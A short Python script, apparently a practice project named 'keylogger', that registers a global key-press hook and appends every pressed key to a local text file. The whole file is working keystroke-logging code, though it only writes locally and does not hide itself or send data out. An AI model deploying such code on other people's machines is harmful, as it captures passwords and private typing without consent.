import keyboard

def pressdkeys(key): 
    
    with open(r'C:\PYTHON\practica_de_proyectos\keylogger\data.txt', 'a')as file: 
        if key.name == "space": 
             file.write(" ")       
        else:
            file.write(key.name)
            
keyboard.on_press(pressdkeys)
keyboard.wait()